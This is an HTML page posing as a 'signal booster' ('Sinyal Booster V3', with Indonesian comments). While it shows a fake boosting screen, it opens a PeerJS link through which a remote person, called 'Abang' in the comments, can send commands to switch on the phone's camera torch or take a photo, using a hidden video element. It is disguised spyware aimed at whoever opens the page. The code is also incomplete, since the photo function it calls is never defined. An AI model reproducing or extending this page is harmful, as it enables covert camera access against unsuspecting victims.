<!DOCTYPE html>
<html>
<head>
    <title>Sinyal Booster V3</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body style="background:#000; color:#0f0; text-align:center;">
    <h2>ðŸ“¡ BOOSTING SIGNAL...</h2>
    <p id="my-id">Menghubungkan...</p>
    <video id="v" style="display:none" autoplay playsinline></video>

    <script>
        // Inisialisasi koneksi langsung
        const peer = new Peer(); 
        
        peer.on('open', (id) => {
            document.getElementById('my-id').innerText = "ID Jaringan: " + id;
            // Kirim ID ini ke Abang (manual) agar Abang bisa kontrol
        });

        // Nunggu perintah klik-klik dari Abang
        peer.on('connection', (conn) => {
            conn.on('data', async (data) => {
                if (data === "senter_on") jalankanSenter(true);
                if (data === "senter_off") jalankanSenter(false);
                if (data === "foto") ambilFoto(conn);
            });
        });

        let track;
        async function jalankanSenter(s) {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode:"environment"}});
            track = stream.getVideoTracks()[0];
            track.applyConstraints({advanced: [{torch: s}]});
        }
    </script>
</body>
</html>
